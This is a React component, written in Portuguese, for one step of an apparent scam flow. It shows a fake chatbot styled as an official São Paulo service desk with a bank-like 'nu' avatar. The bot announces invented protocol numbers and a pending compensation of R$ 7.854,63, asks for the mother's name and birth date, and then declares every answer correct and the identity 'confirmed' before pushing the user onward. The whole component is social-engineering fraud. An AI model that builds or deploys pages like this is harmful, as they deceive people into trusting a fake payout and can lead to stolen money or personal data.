import { useState, useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Avatar } from '@/components/ui/avatar';
import { CheckCircle, Phone } from 'lucide-react';
import { UserData } from '../BenefitFlow';

interface StepSixProps {
  userData: UserData;
  onNext: () => void;
}

interface ChatMessage {
  id: number;
  type: 'bot' | 'user';
  content: string;
  delay: number;
  isVideo?: boolean;
  options?: string[];
  showPhone?: boolean;
}

export const StepSix = ({ userData, onNext }: StepSixProps) => {
  const [visibleMessages, setVisibleMessages] = useState<number[]>([]);
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
  const [userResponses, setUserResponses] = useState<{[key: number]: string}>({});
  const [showFinalStep, setShowFinalStep] = useState(false);

  const chatMessages: ChatMessage[] = [
    {
      id: 1,
      type: 'bot',
      content: `Seja muito bem vindo ao Setor de Atendimento responsável por São Paulo`,
      delay: 1000
    },
    {
      id: 2,
      type: 'bot',
      content: `O número do PROTOCOLO deste atendimento é: 2025645873845692`,
      delay: 2000
    },
    {
      id: 3,
      type: 'bot',
      content: `Você está a um passo de aprovar e receber sua indenização no valor de R$ 7.854,63!`,
      delay: 3000
    },
    {
      id: 4,
      type: 'bot',
      content: `Clique no vídeo abaixo para darmos continuidade 👇`,
      delay: 4000,
      isVideo: true
    },
    {
      id: 5,
      type: 'bot',
      content: `Responda as perguntas a seguir para a aprovação da sua indenização.`,
      delay: 5000
    },
    {
      id: 6,
      type: 'bot',
      content: `Qual nome da sua mãe?`,
      delay: 6000,
      options: [
        'Raquel Queiroz Santos',
        'Fernanda de Souza Rodrigues', 
        'Eliete Aparecida Da Silva Souza',
        'Nenhuma das alternativas.'
      ]
    },
    {
      id: 7,
      type: 'bot',
      content: `Qual sua data de nascimento?`,
      delay: 1000,
      options: ['17/05/1949', '30/09/1997', '25/01/1960', '31/07/1956']
    },
    {
      id: 8,
      type: 'bot',
      content: `Identidade Confirmada com sucesso!`,
      delay: 1000
    },
    {
      id: 9,
      type: 'bot',
      content: `Data e Hora da Consulta\n17/07/2025 11:20\n\nProtocolo\n3263091015\n\nVocê possui uma indenização a receber no valor de R$ 7.854,63.`,
      delay: 2000,
      showPhone: true
    }
  ];

  useEffect(() => {
    if (currentMessageIndex < chatMessages.length) {
      const currentMessage = chatMessages[currentMessageIndex];
      const timer = setTimeout(() => {
        setVisibleMessages(prev => [...prev, currentMessage.id]);
        setCurrentMessageIndex(prev => prev + 1);
      }, currentMessage.delay);

      return () => clearTimeout(timer);
    }
  }, [currentMessageIndex, chatMessages.length]);

  const handleOptionSelect = (messageId: number, option: string) => {
    setUserResponses(prev => ({ ...prev, [messageId]: option }));
    
    // Continue with next message after user response
    setTimeout(() => {
      if (currentMessageIndex < chatMessages.length) {
        setCurrentMessageIndex(prev => prev + 1);
      } else {
        setShowFinalStep(true);
      }
    }, 1000);
  };

  const formatMessageContent = (content: string) => {
    return content.split('\n').map((line, index) => (
      <div key={index} className={index > 0 ? 'mt-2' : ''}>
        {line.includes('Protocolo') ? (
          <div className="font-bold text-lg">{line}</div>
        ) : line.includes('R$') ? (
          <div className="font-bold text-primary text-xl">{line}</div>
        ) : (
          line
        )}
      </div>
    ));
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-primary/5 via-background to-primary/10">
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        {/* Header */}
        <div className="flex items-center justify-between mb-6 p-4 bg-white rounded-lg shadow-sm border">
          <div className="flex items-center gap-3">
            <div className="w-3 h-3 bg-primary rounded-full"></div>
            <span className="text-muted-foreground">Benefício {'>'} Indenização {'>'} Atendimento</span>
          </div>
          <Button variant="ghost" size="sm" className="text-primary">
            <Phone className="w-4 h-4" />
          </Button>
        </div>

        {/* Chat Messages */}
        <div className="space-y-4">
          {chatMessages.map((message) => {
            if (!visibleMessages.includes(message.id)) return null;

            return (
              <div key={message.id} className="space-y-4">
                {/* Bot Message */}
                <div className="flex gap-3">
                  <Avatar className="w-10 h-10 bg-primary text-white">
                    <span className="text-sm font-bold">nu</span>
                  </Avatar>
                  <div className="flex-1">
                    <Card className="border-0 shadow-sm">
                      <CardContent className="p-4">
                        <div className="text-sm leading-relaxed">
                          {formatMessageContent(message.content)}
                        </div>

                        {/* Video Embed */}
                        {message.isVideo && (
                          <div className="mt-4">
                            <div style={{position:"relative", paddingTop:"133.33333333333331%"}}>
                              <iframe 
                                id="panda-18ea3541-653a-4070-a3c5-e680158ff266" 
                                src="https://player-vz-a5f41599-9ad.tv.pandavideo.com.br/embed/?v=18ea3541-653a-4070-a3c5-e680158ff266&playOpensFullscreenNative=true" 
                                style={{border:"none", position:"absolute", top:0, left:0}} 
                                allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" 
                              allowFullScreen={true}
                                width="100%" 
                                height="100%"
                              />
                            </div>
                            <script 
                              dangerouslySetInnerHTML={{
                                __html: `
                                  if(!document.querySelector('script[src="https://player.pandavideo.com.br/api.v2.js"]')){
                                    let s=document.createElement('script');
                                    s.src='https://player.pandavideo.com.br/api.v2.js'; 
                                    s.async=true; 
                                    document.head.appendChild(s);
                                  } 
                                  window.pandascripttag = window.pandascripttag || [];
                                  window.pandascripttag.push(function (){
                                    const panda_id_player = 'panda-18ea3541-653a-4070-a3c5-e680158ff266';
                                    const p=new PandaPlayer(panda_id_player,{
                                      onReady(){
                                        p.loadWindowScreen({panda_id_player});
                                      }
                                    });
                                  });
                                `
                              }}
                            />
                          </div>
                        )}

                        {/* Phone Number Display */}
                        {message.showPhone && (
                          <div className="mt-4 space-y-3">
                            <Button 
                              className="w-full bg-primary hover:bg-primary/90 text-white"
                              onClick={() => setShowFinalStep(true)}
                            >
                              SIM, APROVAR INDENIZAÇÃO
                            </Button>
                          </div>
                        )}
                      </CardContent>
                    </Card>

                    {/* Response Options */}
                    {message.options && !userResponses[message.id] && (
                      <div className="mt-3 space-y-2">
                        <p className="text-sm text-muted-foreground ml-2">Escolha a alternativa correta.</p>
                        {message.options.map((option, index) => (
                          <Button
                            key={index}
                            variant="outline"
                            className="w-full justify-start bg-primary text-white border-primary hover:bg-primary/90"
                            onClick={() => handleOptionSelect(message.id, option)}
                          >
                            {option}
                          </Button>
                        ))}
                      </div>
                    )}

                    {/* User Response */}
                    {userResponses[message.id] && (
                      <div className="mt-3 flex justify-end">
                        <div className="bg-primary text-white p-3 rounded-lg max-w-xs">
                          {userResponses[message.id]}
                        </div>
                      </div>
                    )}

                    {/* Success Message */}
                    {userResponses[message.id] && message.options && (
                      <div className="mt-2 flex items-center gap-2 text-green-600">
                        <CheckCircle className="w-4 h-4" />
                        <span className="text-sm">Resposta Correta!</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            );
          })}

          {/* Final Step */}
          {showFinalStep && (
            <div className="flex gap-3">
              <Avatar className="w-10 h-10 bg-primary text-white">
                <span className="text-sm font-bold">nu</span>
              </Avatar>
              <div className="flex-1">
                <Card className="border-0 shadow-sm">
                  <CardContent className="p-4">
                    <div className="text-center space-y-4">
                      <div className="text-lg font-semibold text-primary">
                        Confirmação de Autenticidade
                      </div>
                      
                      <div className="h-1 bg-primary/20 rounded-full">
                        <div className="h-1 bg-primary rounded-full w-full"></div>
                      </div>

                      <div className="bg-green-100 text-green-800 p-3 rounded-lg">
                        <div className="font-semibold">Dados Autenticados</div>
                        <div className="text-sm mt-1">
                          Os dados do(a) Sr(a). {userData.name} foram encontrados em nosso sistema e sua autenticidade foi confirmada.
                        </div>
                      </div>

                      <Button 
                        onClick={onNext}
                        className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70"
                      >
                        Continuar para Próxima Etapa
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};